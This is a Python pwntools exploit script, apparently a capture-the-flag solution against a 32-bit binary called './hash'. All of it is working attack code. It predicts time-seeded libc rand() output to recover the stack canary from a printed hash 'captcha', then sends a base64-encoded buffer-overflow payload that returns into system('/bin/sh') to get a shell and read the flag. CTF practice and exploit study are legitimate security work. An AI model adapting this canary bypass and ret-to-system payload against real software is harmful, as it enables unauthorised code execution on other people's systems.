#!/usr/bin/env python3

from pwn import *
import os
from ctypes import CDLL, c_int32, c_uint32
import base64

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './hash'

# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)

# Add this directory to the LD_LIBRARY_PATH, to use the libcrypto.so
os.environ['LD_LIBRARY_PATH'] = f'{os.getcwd()}'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

# get rand seed (current unix time)
seed = int(time.time())
libc = CDLL("libc.so.6")
libc.srand(seed)

# start the process
io = start()

# reverse engineer stack canary
io.recvuntil(b' : ')
hash_captcha = io.recvline().strip()
log.info(f"hash_captcha: {int(hash_captcha)}")

rand_ints = []
for _ in range(8):
    rand_ints.append(libc.rand())
hash_no_canary = rand_ints[5] + rand_ints[1] + (rand_ints[2] - rand_ints[3]) +\
        rand_ints[7] + (rand_ints[4] - rand_ints[6])
stack_canary = c_uint32(int(hash_captcha) - hash_no_canary).value
log.info(f"stack_canary: {hex(stack_canary)}")
io.sendline(hash_captcha)

# send payload to pop a shell
SYSTEM_ADDR = 0x8049187
BIN_SH_ADDR = 0x804b0e0 + 716 # g_buf + 716 = "/bin/sh"
payload = flat(
        b'B' * 512,
        p32(stack_canary),
        b'A'*12,
        p32(SYSTEM_ADDR),
        p32(BIN_SH_ADDR),
        )
payload = base64.b64encode(payload) + b'/bin/sh\x00'
io.sendlineafter(b'Encode your data with BASE64 then paste me!\n', payload)

# Receive the flag
io.recvline()
io.interactive()
io.close()
